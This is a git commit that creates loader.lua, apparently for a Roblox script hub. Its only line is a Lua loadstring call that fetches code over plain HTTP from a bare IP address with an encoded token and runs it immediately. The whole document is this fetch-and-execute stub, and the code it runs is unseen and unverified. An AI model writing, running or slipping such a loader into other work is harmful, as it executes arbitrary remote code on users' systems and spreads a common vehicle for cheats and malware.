1ec5a681274e51880a139b29bb8016c2ad873d88
WolflannScripts <taeistnkzxx@gmail.com>
2026-01-30 05:57:39 +0500

    Create loader.lua

---
+++ loader.lua
@@ -0,0 +1,1 @@
+loadstring(game:HttpGet("http://109.71.240.235:3910/api/run/eyJpZCI6IjdkYmZjODA1LTE3MzktNGI5MC05MTk3LWE5YjZiMTBkMGVlNCIsImtpbmQiOiJsb2FkZXIiLCJ2aXN1YWwiOnsiaWQiOiJ1bml2ZXJzYWwifX0"))()
